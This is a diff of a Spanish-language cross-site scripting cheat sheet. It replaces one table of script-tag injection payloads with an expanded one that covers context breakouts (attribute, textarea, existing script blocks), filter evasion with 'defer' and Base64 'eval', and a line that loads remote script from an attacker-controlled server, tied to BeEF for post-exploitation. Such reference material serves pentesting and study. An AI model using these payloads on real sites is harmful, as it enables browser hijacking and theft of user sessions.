@@ -15,13 +15,15 @@ linked:
 
 ## Cheatsheet
 
-| **Propósito del Vector**                   | **Contexto / Notas de Uso**                                                                                                                             | **Payload Específico**                             |
-| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
-| PoC (Proof of Concept) básica.             | Verifica de forma inmediata si las etiquetas de apertura y cierre son interpretadas por el navegador.                                                   | `<script>alert(1)</script>`                        |
-| Ejecución de script remoto (Out-of-Band).  | Fundamental para la explotación real. Permite cargar payloads complejos, bypass de limitación de caracteres y conexión con herramientas como BeEF.      | `<script src="https://ev.il/xss.js"></script>`     |
-| Declaración explícita del tipo MIME.       | Útil al interactuar con analizadores web (parsers) más antiguos o estrictos que requieren el atributo `type` para procesar el bloque.                   | `<script type="text/javascript">alert(1)</script>` |
-| Alteración del flujo de carga.             | Aprovecha atributos estándar de HTML5. A veces los filtros buscan la cadena exacta `<script>`, y añadir atributos lícitos puede evadir reglas simples.  | `<script defer>alert(1)</script>`                  |
-| Ofuscación del cuerpo del script (Base64). | Permite ocultar el código malicioso (ej. `alert(1)`) de los filtros (WAF) que analizan el contenido entre las etiquetas, sin alterar la etiqueta en sí. | `<script>eval(atob('YWxlcnQoMSk='))</script>`      |
+|**Vector / Payload**|**Contexto de Inyección**|**Análisis de la Estructura y Uso**|
+|---|---|---|
+|`<script>alert(1)</script>`|HTML general.|El vector más básico y directo. Verifica instantáneamente si el motor de renderizado del navegador procesa las etiquetas de apertura y cierre para ejecutar código nativo.|
+|`<script src="https://mi-servidor.com/x.js"></script>`|HTML general (Carga remota).|Fundamental para la explotación real. Permite importar payloads complejos, evadir límites de longitud de caracteres en el input y conectar con frameworks de post-explotación (ej. BeEF).|
+|`"><script>alert(1)</script>`|Reflejo dentro de un atributo (ej. `value=""`).|Escapa del contexto del atributo cerrando las comillas y la etiqueta anfitriona original (como un `<input>`), forzando al navegador a interpretar el `<script>` como un nuevo bloque HTML.|
+|`</textarea><script>alert(1)</script>`|Reflejo en bloques de texto plano (`<textarea>`, `<title>`, `<xmp>`).|Estas etiquetas tratan todo su contenido interno como texto inerte. Es estrictamente necesario cerrarlas primero explícitamente para que la inyección sea parseada como código ejecutable.|
+|`';}</script><script>alert(1)</script>`|Reflejo dentro de un bloque `<script>` legítimo existente.|Rompe la cadena de texto de la variable original, cierra el bloque de script preexistente para evitar errores de sintaxis residuales, y abre un entorno de ejecución completamente limpio y controlado.|
+|`<script defer>alert(1)</script>`|Filtros léxicos básicos.|Evasión de WAF o listas negras simples que buscan la cadena exacta `<script>`. La inclusión de atributos estándar de HTML5 como `defer`, `async` o `type="text/javascript"` altera la firma esperada.|
+|`<script>eval(atob('YWxlcnQoMSk='))</script>`|Filtros de contenido interno.|Oculta el payload malicioso (ej. `alert(1)`) de los filtros que analizan el texto entre las etiquetas. Decodifica el string en Base64 en tiempo de ejecución y lo pasa a la función `eval()`.|
 
 ### Ruptura de Contextos Existentes
 
